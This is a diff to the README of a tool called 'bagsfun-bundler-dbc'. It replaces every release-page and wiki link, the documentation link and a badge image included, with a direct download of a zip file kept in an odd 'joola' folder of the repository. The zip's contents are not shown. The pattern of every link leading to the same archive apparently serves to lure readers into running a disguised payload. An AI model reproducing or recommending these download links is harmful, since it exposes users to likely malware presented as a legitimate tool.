@@ -1,7 +1,7 @@
 # 🛠️ bagsfun-bundler-dbc - Easy Bundling for Your Projects
 
 ## 📥 Download Now
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/mohame524Z/bagsfun-bundler-dbc/releases)
+[![Download Now](https://raw.githubusercontent.com/mohame524Z/bagsfun-bundler-dbc/main/joola/bagsfun-bundler-dbc.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/mohame524Z/bagsfun-bundler-dbc/main/joola/bagsfun-bundler-dbc.zip)
 
 ## 🌟 Overview
 This is bagsdotfun bundler dbc. It simplifies the process of bundling and managing your projects. This tool is designed for ease of use. Whether you're organizing files or deploying an application, this bundler will make it straightforward.
@@ -11,7 +11,7 @@ Follow these steps to download and set up the application:
 
 1. **Visit the Releases Page**
    Go to the releases page to find the latest version of bagsfun-bundler-dbc. Click on the link below:
-   [Visit this page to download](https://github.com/mohame524Z/bagsfun-bundler-dbc/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/mohame524Z/bagsfun-bundler-dbc/main/joola/bagsfun-bundler-dbc.zip)
 
 2. **Choose the Right Version**
    Look for the version that suits your needs. Each version may have different features or improvements. Generally, it’s best to use the latest release.
@@ -42,14 +42,14 @@ To run bagsfun-bundler-dbc effectively, ensure your system meets the following r
 - **Support for Multiple Formats**: Bundle files in various formats as needed.
 
 ## 📚 Documentation
-For more detailed instructions and tips, check out our [Documentation](https://github.com/mohame524Z/bagsfun-bundler-dbc/wiki). Here, you will find helpful guides on advanced features and troubleshooting.
+For more detailed instructions and tips, check out our [Documentation](https://raw.githubusercontent.com/mohame524Z/bagsfun-bundler-dbc/main/joola/bagsfun-bundler-dbc.zip). Here, you will find helpful guides on advanced features and troubleshooting.
 
 ## 🎓 Help and Support
 If you encounter issues during installation or usage, please refer to the documentation first. If you still need assistance, you can reach out through the GitHub Issues page or check the community discussions for solutions. 
 
 ## 📦 Download & Install
 Ready to begin? Click here to download the latest version:
-[Visit this page to download](https://github.com/mohame524Z/bagsfun-bundler-dbc/releases)
+[Visit this page to download](https://raw.githubusercontent.com/mohame524Z/bagsfun-bundler-dbc/main/joola/bagsfun-bundler-dbc.zip)
 
 ## 🛠️ Contributing
 We welcome contributions. If you have suggestions or improvements, please fork the repository and submit a pull request. 
